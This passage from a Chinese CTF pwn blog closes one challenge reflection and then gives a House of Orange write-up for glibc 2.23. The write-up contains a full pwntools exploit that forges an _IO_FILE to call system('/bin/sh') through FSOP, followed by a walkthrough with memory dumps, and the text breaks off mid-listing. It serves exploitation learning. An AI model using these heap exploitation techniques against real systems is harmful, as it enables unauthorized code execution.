<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fe67e7edae8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fe67e7edae8</span> (_IO_wide_data_0+<span class="number">296</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fe67e7edaf0</span> (_IO_wide_data_0+<span class="number">304</span>) ◂— <span class="number">0x61</span> <span class="comment">/* &#x27;a&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7fe67e7edaf8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7fe67e7edb00</span> (__memalign_hook) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7fe67e7edb08</span> (__realloc_hook) —▸ <span class="number">0x7fe67e46e27a</span> (do_system+<span class="number">1098</span>) ◂— mov    rax, qword ptr [rip + <span class="number">0x37ec37</span>]</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7fe67e7edb10</span> (__malloc_hook) —▸ <span class="number">0x7fe67e4ad718</span> (<span class="built_in">realloc</span>+<span class="number">8</span>) ◂— mov    r12, rsi</span><br></pre></td></tr></table></figure>
<p>top chunk 的申请没有“size”的要求，对 <code>__realloc_hook</code> 和 <code>__malloc_hook</code> 的操作是为了重置栈帧</p>
<hr>
<p><strong>小结：</strong></p>
<p>这6个多小时的解题有点折磨，最后看了wp回头看本题目时，发现思路也挺清晰</p>
<p>反正我是把可能技术都尝试了一遍：</p>
<ul>
<li>首先是 leak 那里就出来问题，泄露出了“heap_addr”但是泄露不出“libc_base”（“size”的限制）</li>
<li>在此基础上，因为有 off-by-one 所以我选择打 unlink，结果当然失败了，先不管实现了 overlap 有什么用，覆盖“size-&gt;P位”的过程会把整个“size”给覆盖掉</li>
<li>使用 Double free 修改了“chunk-&gt;size”把它释放到了 unsortedbin 中，泄露了“libc_base”</li>
<li>接下来我当然想到了利用 Double free 劫持 hook，还是因为“size”的原因劫持不了（hook前面也没有“\x55”等可以劫持的地址）</li>
<li>又想到可以控制 top chunk 来打 House Of Force（size限制，排除）和 House Of Einherjar（只能控制 top chunk 前面的区域，控制不了 hook，排除）</li>
<li>House Of Orange 肯定也不行</li>
<li>FSOP 中 unsortedbin attack 勉强可以执行，但是 FSOP 需要伪造很长的IO_FILE结构体，size明显不符合条件</li>
<li>然后选择 main_arena 劫持，因为 top chunk 那里有“0x55”（main_arena+88），但是接下来只能劫持后面的 unsortedbin 了，末尾置空又会导致严重的段错误</li>
</ul>
<p>最后止步于此…………</p>
<p>看了大佬的wp，发现其核心在于把“0x61”放入 fastbin 中，而后对应的 main_arena 条目就变为了“0x61”，可以利用 Double free 申请到这里，从而可以控制 top chunk（top chunk的检查比fastbin，unsortedbin少很多）</p>
<ul>
<li>本题目使我的堆风水提高了不少（我前前后后改了不知道多少遍堆风水，最后才避免了报错）</li>
<li>另外学习到了 main_arena 劫持这门技术（限制“size”时必选）</li>
</ul>
<p>我觉得我还是缺少历练，需要多多打比赛（挨打），做题（坐牢）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/18/House%20Of%20Orange-2.23-64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/18/House%20Of%20Orange-2.23-64/" class="post-title-link" itemprop="url">House Of Orange-2.23-64</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-18 01:52:29" itemprop="dateCreated datePublished" datetime="2022-03-18T01:52:29+08:00">2022-03-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-27 12:11:42" itemprop="dateModified" datetime="2022-04-27T12:11:42+08:00">2022-04-27</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>houseoforange</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./houseoforange</span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">@          House of Orange          @</span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line"> <span class="number">1.</span> Build the house                  </span><br><span class="line"> <span class="number">2.</span> See the house                    </span><br><span class="line"> <span class="number">3.</span> Upgrade the house                </span><br><span class="line"> <span class="number">4.</span> Give up                          </span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">Your choice : </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">houseoforange: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=a58bda41b65d38949498561b0f2b976ce5c0c301, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/ywhkkx/桌面/houseoforange&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu3)</span> stable release version</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ORANGE</span> *<span class="title">org</span>;</span> <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( upgrade_cnt &lt;= <span class="number">2u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( g_house )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Length of name :&quot;</span>);</span><br><span class="line">      size = get_int();</span><br><span class="line">      <span class="keyword">if</span> ( size &gt; <span class="number">0x1000</span> )</span><br><span class="line">        size = <span class="number">4096</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">      read_n(g_house-&gt;name, size);              <span class="comment">// overflow</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Price of Orange: &quot;</span>);</span><br><span class="line">      org = g_house-&gt;org;</span><br><span class="line">      org-&gt;price = get_int();</span><br><span class="line">      color_menu();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Color of Orange: &quot;</span>);</span><br><span class="line">      v2 = get_int();</span><br><span class="line">      <span class="keyword">if</span> ( v2 != <span class="number">56746</span> &amp;&amp; (v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">7</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No such color&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v2 == <span class="number">56746</span> )</span><br><span class="line">        g_house-&gt;org-&gt;color = <span class="number">56746</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        g_house-&gt;org-&gt;color = v2 + <span class="number">30</span>;</span><br><span class="line">      ++upgrade_cnt;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Finish&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;No such house !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t upgrade more&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>修改模块的“size”可以执行控制，导致了严重的堆溢出</p>
<p><strong>入侵思路</strong></p>
<p>本程序没有释放模块，传统的入侵都失效了</p>
<p>本题目是 house of orange 的开山之作，学习本题目也就是为了学习 house of orange 和 FSOP，先挂上大佬的 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./houseoforange&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./houseoforange&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content, price, color</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">	r.send(content)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)	<span class="comment">#1-7</span></span><br><span class="line">	r.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">size, content, price, color</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">	r.send(content)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)	<span class="comment">#1-7</span></span><br><span class="line">	r.sendline(<span class="built_in">str</span>(color))</span><br><span class="line">	</span><br><span class="line"><span class="comment"># get the unsortedbin</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;aaaa\n&#x27;</span>,<span class="number">0x1234</span>,<span class="number">0xddaa</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span> + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0xf81</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload), payload, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;a\n&#x27;</span>,<span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x668</span> - <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;malloc_hook = &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc.address = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">io_list_all = libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap_addr</span></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0x10</span>, payload, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap - <span class="number">0xE0</span></span><br><span class="line">success(<span class="string">&#x27;heap = &#x27;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># FSOP</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x400</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)<span class="comment">#to small bin</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base+<span class="number">0x5E8</span>) <span class="comment">#vtable ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_file += p64(system)</span><br><span class="line">payload += fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload), payload, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>接下来就借这个 exp 来学习 house of orange 和 FSOP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get the unsortedbin</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;aaaa\n&#x27;</span>,<span class="number">0x1234</span>,<span class="number">0xddaa</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span> + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0xf81</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload), payload, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;a\n&#x27;</span>,<span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br></pre></td></tr></table></figure>
<p>函数 add 的后两个参数是凑数的，不用考虑，这里就是为了 unsortedbin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55ac5249a0c0</span> —▸ <span class="number">0x7fa36d3deb78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55ac5249a0c0</span></span><br></pre></td></tr></table></figure>
<p>泄露 libc_base 的过程没有什么好说的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">pause()</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x668</span> - <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;malloc_hook = &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc.address = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">io_list_all = libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55cc39c6a0e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000411</span> <span class="comment">// add 0x400</span></span><br><span class="line"><span class="number">0x55cc39c6a0f0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x00007ff3f687e188</span> <span class="comment">// leak libc_base</span></span><br><span class="line"><span class="number">0x55cc39c6a100</span>:	<span class="number">0x000055cc39c6a0e0</span>	<span class="number">0x000055cc39c6a0e0</span> <span class="comment">// leak heap_addr</span></span><br></pre></td></tr></table></figure>
<p>可以通过泄露 large chunk-&gt;FD_nextsize 来泄露 heap_addr：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak heap_addr</span></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0x10</span>, payload, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 这里注意把&quot;\x00&quot;覆盖掉</span></span><br><span class="line">heap = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap - <span class="number">0xE0</span></span><br><span class="line">success(<span class="string">&#x27;heap = &#x27;</span>+<span class="built_in">hex</span>(heap))</span><br></pre></td></tr></table></figure>
<p>所以 leak 已经完成，最后就是FSOP了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fake _IO_list_all(stderr) to FSOP</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x400</span> + p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) <span class="comment"># to 0x60 smallbin</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) <span class="comment"># unsortedbin attack</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment"># _IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base+<span class="number">0x5E8</span>) <span class="comment"># vtable ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_file += p64(system)</span><br><span class="line">payload += fake_file</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="built_in">len</span>(payload), payload, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>) <span class="comment"># 执行malloc</span></span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>这一大串的伪造让人摸不着头脑，但却可以达成目的（有点像SROP）</p>
<p>修改模块覆盖前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55e7fa48d4f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x55e7fa48d500</span>:	<span class="number">0x0000ddaa00001234</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d510</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000ad1</span></span><br><span class="line"><span class="number">0x55e7fa48d520</span>:	<span class="number">0x00007fd8c195bb78</span>	<span class="number">0x00007fd8c195bb78</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55e7fa48d510</span> —▸ <span class="number">0x7fd8c195bb78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55e7fa48d510</span></span><br></pre></td></tr></table></figure>
<p>修改模块覆盖后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55e7fa48d4e0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span> <span class="comment">// padding</span></span><br><span class="line"><span class="number">0x55e7fa48d4f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x55e7fa48d500</span>:	<span class="number">0x0000ddaa00001234</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d510</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000061</span> <span class="comment">// &quot;/bin/sh&quot; + fake_size</span></span><br><span class="line">    <span class="comment">/* 